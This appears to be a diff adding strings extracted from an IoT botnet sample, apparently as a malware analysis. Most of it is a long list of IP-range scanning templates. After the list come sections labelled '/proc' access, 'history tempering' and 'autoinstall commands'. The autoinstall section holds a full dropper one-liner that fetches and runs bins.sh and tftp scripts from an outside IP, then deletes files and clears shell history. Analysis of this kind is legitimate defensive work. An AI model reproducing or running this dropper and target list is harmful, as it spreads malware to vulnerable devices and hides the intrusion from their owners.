+180.253.%d.%d
+180.254.%d.%d
+180.92.%d.%d
+181.20.%d.%d
+181.24.%d.%d
+181.66.%d.%d
+182.181.%d.%d
+182.182.%d.%d
+182.183.%d.%d
+182.184.%d.%d
+182.185.%d.%d
+182.186.%d.%d
+182.187.%d.%d
+182.188.%d.%d
+182.189.%d.%d
+182.190.%d.%d
+182.191.%d.%d
+182.52.%d.%d
+182.56.%d.%d
+182.57.%d.%d
+182.58.%d.%d
+182.59.%d.%d
+182.60.%d.%d
+182.64.%d.%d
+182.65.%d.%d
+182.68.%d.%d
+182.70.%d.%d
+183.220.%d.%d
+183.223.%d.%d
+183.233.%d.%d
+184.24.%d.%d
+184.85.%d.%d
+186.0.%d.%d
+186.128.%d.%d
+186.132.%d.%d
+186.133.%d.%d
+186.38.%d.%d
+186.39.%d.%d
+186.40.%d.%d
+186.41.%d.%d
+186.42.%d.%d
+186.57.%d.%d
+186.58.%d.%d
+186.59.%d.%d
+186.60.%d.%d
+187.1.%d.%d
+187.116.%d.%d
+187.117.%d.%d
+187.118.%d.%d
+187.119.%d.%d
+187.156.%d.%d
+187.157.%d.%d
+187.171.%d.%d
+187.192.%d.%d
+187.198.%d.%d
+187.200.%d.%d
+187.203.%d.%d
+187.206.%d.%d
+187.208.%d.%d
+187.209.%d.%d
+187.210.%d.%d
+187.216.%d.%d
+187.236.%d.%d
+187.237.%d.%d
+187.4.%d.%d
+187.5.%d.%d
+187.52.%d.%d
+187.53.%d.%d
+187.54.%d.%d
+187.55.%d.%d
+187.6.%d.%d
+187.7.%d.%d
+187.88.%d.%d
+187.89.%d.%d
+187.90.%d.%d
+187.91.%d.%d
+188.3.%d.%d
+189.10.%d.%d
+189.11.%d.%d
+189.134.%d.%d
+189.138.%d.%d
+189.139.%d.%d
+189.140.%d.%d
+189.142.%d.%d
+189.143.%d.%d
+189.144.%d.%d
+189.150.%d.%d
+189.157.%d.%d
+189.184.%d.%d
+189.191.%d.%d
+189.232.%d.%d
+189.233.%d.%d
+189.240.%d.%d
+189.241.%d.%d
+189.254.%d.%d
+189.30.%d.%d
+189.31.%d.%d
+189.72.%d.%d
+189.73.%d.%d
+189.74.%d.%d
+189.75.%d.%d
+189.96.%d.%d
+189.97.%d.%d
+189.98.%d.%d
+189.99.%d.%d
+190.0.%d.%d
+190.172.%d.%d
+190.173.%d.%d
+190.174.%d.%d
+190.175.%d.%d
+190.176.%d.%d
+190.177.%d.%d
+190.178.%d.%d
+190.48.%d.%d
+190.49.%d.%d
+190.50.%d.%d
+190.51.%d.%d
+191.0.%d.%d
+191.10.%d.%d
+191.11.%d.%d
+191.12.%d.%d
+191.13.%d.%d
+191.14.%d.%d
+191.15.%d.%d
+191.16.%d.%d
+191.17.%d.%d
+191.172.%d.%d
+191.18.%d.%d
+191.19.%d.%d
+191.193.%d.%d
+191.194.%d.%d
+191.195.%d.%d
+191.196.%d.%d
+191.197.%d.%d
+191.198.%d.%d
+191.199.%d.%d
+191.20.%d.%d
+191.200.%d.%d
+191.201.%d.%d
+191.202.%d.%d
+191.203.%d.%d
+191.204.%d.%d
+191.205.%d.%d
+191.206.%d.%d
+191.207.%d.%d
+191.208.%d.%d
+191.21.%d.%d
+191.210.%d.%d
+191.211.%d.%d
+191.216.%d.%d
+191.217.%d.%d
+191.218.%d.%d
+191.219.%d.%d
+191.22.%d.%d
+191.220.%d.%d
+191.221.%d.%d
+191.222.%d.%d
+191.223.%d.%d
+191.23.%d.%d
+191.24.%d.%d
+191.25.%d.%d
+191.26.%d.%d
+191.27.%d.%d
+191.28.%d.%d
+191.29.%d.%d
+191.30.%d.%d
+191.31.%d.%d
+191.32.%d.%d
+191.78.%d.%d
+191.8.%d.%d
+191.80.%d.%d
+191.81.%d.%d
+191.82.%d.%d
+191.83.%d.%d
+191.84.%d.%d
+191.85.%d.%d
+191.86.%d.%d
+191.9.%d.%d
+195.54.%d.%d
+2.112.%d.%d
+2.114.%d.%d
+2.116.%d.%d
+2.118.%d.%d
+2.23.%d.%d
+2.60.%d.%d
+2.61.%d.%d
+2.62.%d.%d
+2.63.%d.%d
+200.101.%d.%d
+200.102.%d.%d
+200.103.%d.%d
+200.138.%d.%d
+200.140.%d.%d
+200.163.%d.%d
+200.180.%d.%d
+200.181.%d.%d
+200.193.%d.%d
+200.203.%d.%d
+200.215.%d.%d
+200.64.%d.%d
+200.65.%d.%d
+200.78.%d.%d
+200.95.%d.%d
+200.96.%d.%d
+201.10.%d.%d
+201.100.%d.%d
+201.101.%d.%d
+201.104.%d.%d
+201.109.%d.%d
+201.11.%d.%d
+201.116.%d.%d
+201.117.%d.%d
+201.120.%d.%d
+201.122.%d.%d
+201.128.%d.%d
+201.136.%d.%d
+201.14.%d.%d
+201.147.%d.%d
+201.15.%d.%d
+201.155.%d.%d
+201.2.%d.%d
+201.24.%d.%d
+201.25.%d.%d
+201.3.%d.%d
+201.34.%d.%d
+201.35.%d.%d
+201.40.%d.%d
+201.41.%d.%d
+201.66.%d.%d
+201.67.%d.%d
+201.7.%d.%d
+201.89.%d.%d
+201.99.%d.%d
+202.164.%d.%d
+202.44.%d.%d
+203.134.%d.%d
+203.150.%d.%d
+203.210.%d.%d
+210.1.%d.%d
+210.14.%d.%d
+210.213.%d.%d
+210.23.%d.%d
+210.56.%d.%d
+211.237.%d.%d
+212.131.%d.%d
+212.164.%d.%d
+212.20.%d.%d
+212.210.%d.%d
+212.216.%d.%d
+213.26.%d.%d
+213.82.%d.%d
+217.141.%d.%d
+217.56.%d.%d
+221.120.%d.%d
+221.121.%d.%d
+222.124.%d.%d
+222.252.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.255.%d.%d
+223.190.%d.%d
+223.29.%d.%d
+23.7.%d.%d
+27.0.%d.%d
+27.112.%d.%d
+27.192.%d.%d
+27.255.%d.%d
+27.50.%d.%d
+27.54.%d.%d
+27.8.%d.%d
+27.98.%d.%d
+31.162.%d.%d
+31.194.%d.%d
+31.195.%d.%d
+31.196.%d.%d
+31.198.%d.%d
+36.248.%d.%d
+36.32.%d.%d
+36.64.%d.%d
+36.65.%d.%d
+36.66.%d.%d
+36.67.%d.%d
+36.68.%d.%d
+36.69.%d.%d
+36.70.%d.%d
+36.71.%d.%d
+36.72.%d.%d
+36.73.%d.%d
+36.74.%d.%d
+36.75.%d.%d
+36.76.%d.%d
+36.77.%d.%d
+36.78.%d.%d
+36.79.%d.%d
+36.80.%d.%d
+36.81.%d.%d
+36.82.%d.%d
+36.83.%d.%d
+36.84.%d.%d
+36.85.%d.%d
+36.86.%d.%d
+36.88.%d.%d
+37.158.%d.%d
+37.206.%d.%d
+37.207.%d.%d
+37.247.%d.%d
+39.34.%d.%d
+39.64.%d.%d
+41.174.%d.%d
+41.208.%d.%d
+41.252.%d.%d
+41.253.%d.%d
+41.254.%d.%d
+42.176.%d.%d
+42.224.%d.%d
+42.4.%d.%d
+42.48.%d.%d
+42.52.%d.%d
+42.56.%d.%d
+42.63.%d.%d
+42.84.%d.%d
+43.230.%d.%d
+43.240.%d.%d
+43.245.%d.%d
+43.252.%d.%d
+43.253.%d.%d
+45.115.%d.%d
+45.117.%d.%d
+45.120.%d.%d
+45.121.%d.%d
+45.127.%d.%d
+49.118.%d.%d
+49.156.%d.%d
+5.78.%d.%d
+50.205.%d.%d
+50.233.%d.%d
+58.69.%d.%d
+58.71.%d.%d
+59.103.%d.%d
+59.153.%d.%d
+59.176.%d.%d
+59.177.%d.%d
+59.178.%d.%d
+59.179.%d.%d
+59.180.%d.%d
+59.181.%d.%d
+59.182.%d.%d
+59.183.%d.%d
+59.184.%d.%d
+59.185.%d.%d
+59.97.%d.%d
+59.98.%d.%d
+59.99.%d.%d
+61.0.%d.%d
+61.1.%d.%d
+61.128.%d.%d
+61.130.%d.%d
+61.131.%d.%d
+61.132.%d.%d
+61.134.%d.%d
+61.137.%d.%d
+61.139.%d.%d
+61.140.%d.%d
+61.144.%d.%d
+61.146.%d.%d
+61.147.%d.%d
+61.150.%d.%d
+61.153.%d.%d
+61.154.%d.%d
+61.155.%d.%d
+61.157.%d.%d
+61.160.%d.%d
+61.164.%d.%d
+61.166.%d.%d
+61.170.%d.%d
+61.174.%d.%d
+61.175.%d.%d
+61.177.%d.%d
+61.178.%d.%d
+61.180.%d.%d
+61.183.%d.%d
+61.184.%d.%d
+61.185.%d.%d
+61.186.%d.%d
+61.94.%d.%d
+62.110.%d.%d
+62.252.%d.%d
+62.255.%d.%d
+62.86.%d.%d
+78.186.%d.%d
+78.188.%d.%d
+78.189.%d.%d
+79.0.%d.%d
+79.10.%d.%d
+79.12.%d.%d
+79.14.%d.%d
+79.15.%d.%d
+79.16.%d.%d
+79.18.%d.%d
+79.2.%d.%d
+79.20.%d.%d
+79.22.%d.%d
+79.24.%d.%d
+79.26.%d.%d
+79.28.%d.%d
+79.29.%d.%d
+79.30.%d.%d
+79.32.%d.%d
+79.34.%d.%d
+79.36.%d.%d
+79.38.%d.%d
+79.39.%d.%d
+79.4.%d.%d
+79.40.%d.%d
+79.42.%d.%d
+79.44.%d.%d
+79.46.%d.%d
+79.48.%d.%d
+79.49.%d.%d
+79.5.%d.%d
+79.50.%d.%d
+79.52.%d.%d
+79.54.%d.%d
+79.55.%d.%d
+79.56.%d.%d
+79.58.%d.%d
+79.59.%d.%d
+79.6.%d.%d
+79.60.%d.%d
+79.62.%d.%d
+79.63.%d.%d
+79.8.%d.%d
+80.104.%d.%d
+80.105.%d.%d
+80.116.%d.%d
+80.117.%d.%d
+80.16.%d.%d
+80.17.%d.%d
+80.18.%d.%d
+80.180.%d.%d
+80.181.%d.%d
+80.182.%d.%d
+80.183.%d.%d
+80.19.%d.%d
+80.20.%d.%d
+80.21.%d.%d
+80.22.%d.%d
+80.23.%d.%d
+81.100.%d.%d
+81.126.%d.%d
+81.72.%d.%d
+81.73.%d.%d
+81.74.%d.%d
+81.75.%d.%d
+82.104.%d.%d
+82.105.%d.%d
+82.106.%d.%d
+82.107.%d.%d
+82.178.%d.%d
+82.184.%d.%d
+82.185.%d.%d
+82.186.%d.%d
+82.187.%d.%d
+82.188.%d.%d
+82.189.%d.%d
+82.190.%d.%d
+82.191.%d.%d
+82.48.%d.%d
+82.49.%d.%d
+82.50.%d.%d
+82.51.%d.%d
+82.52.%d.%d
+82.53.%d.%d
+82.54.%d.%d
+82.55.%d.%d
+82.56.%d.%d
+82.57.%d.%d
+82.58.%d.%d
+82.59.%d.%d
+82.60.%d.%d
+82.61.%d.%d
+82.63.%d.%d
+82.89.%d.%d
+82.90.%d.%d
+82.91.%d.%d
+85.105.%d.%d
+85.154.%d.%d
+85.3.%d.%d
+85.32.%d.%d
+85.33.%d.%d
+85.34.%d.%d
+85.35.%d.%d
+85.36.%d.%d
+85.37.%d.%d
+85.38.%d.%d
+85.39.%d.%d
+85.40.%d.%d
+85.41.%d.%d
+85.42.%d.%d
+85.43.%d.%d
+85.44.%d.%d
+85.45.%d.%d
+85.46.%d.%d
+85.47.%d.%d
+87.0.%d.%d
+87.1.%d.%d
+87.10.%d.%d
+87.12.%d.%d
+87.13.%d.%d
+87.14.%d.%d
+87.16.%d.%d
+87.18.%d.%d
+87.2.%d.%d
+87.20.%d.%d
+87.21.%d.%d
+87.22.%d.%d
+87.23.%d.%d
+87.24.%d.%d
+87.25.%d.%d
+87.28.%d.%d
+87.29.%d.%d
+87.3.%d.%d
+87.30.%d.%d
+87.4.%d.%d
+87.6.%d.%d
+87.8.%d.%d
+88.105.%d.%d
+88.247.%d.%d
+88.248.%d.%d
+88.32.%d.%d
+88.33.%d.%d
+88.34.%d.%d
+88.35.%d.%d
+88.36.%d.%d
+88.38.%d.%d
+88.40.%d.%d
+88.42.%d.%d
+88.44.%d.%d
+88.46.%d.%d
+88.48.%d.%d
+88.5.%d.%d
+88.50.%d.%d
+88.52.%d.%d
+88.54.%d.%d
+88.56.%d.%d
+88.58.%d.%d
+88.60.%d.%d
+88.61.%d.%d
+88.62.%d.%d
+88.63.%d.%d
+91.83.%d.%d
+94.174.%d.%d
+94.50.%d.%d
+94.80.%d.%d
+94.82.%d.%d
+94.84.%d.%d
+94.86.%d.%d
+94.88.%d.%d
+94.90.%d.%d
+94.92.%d.%d
+94.93.%d.%d
+94.94.%d.%d
+94.95.%d.%d
+95.224.%d.%d
+95.228.%d.%d
+95.230.%d.%d
+95.231.%d.%d
+95.232.%d.%d
+95.234.%d.%d
+95.236.%d.%d
+95.238.%d.%d
+95.240.%d.%d
+95.241.%d.%d
+95.242.%d.%d
+95.244.%d.%d
+95.245.%d.%d
+95.246.%d.%d
+95.247.%d.%d
+95.248.%d.%d
+95.250.%d.%d
+95.252.%d.%d
+95.253.%d.%d
+95.254.%d.%d
+95.9.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+/proc/stat
+/proc/cpuinfo
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+cd /tmp; wget http://159.89.35.204/bins.sh || curl -O http://159.89.35.204/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 159.89.35.204 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 159.89.35.204; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n
+history -c;history -w
+history -c
+rm -rf ~/.bash_history
+history -w
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+cd /tmp; wget http://159.89.35.204/bins.sh || curl -O http://159.89.35.204/bins.sh; chmod 777 bins.sh; sh bins.sh; busybox tftp 159.89.35.204 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 159.89.35.204; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n
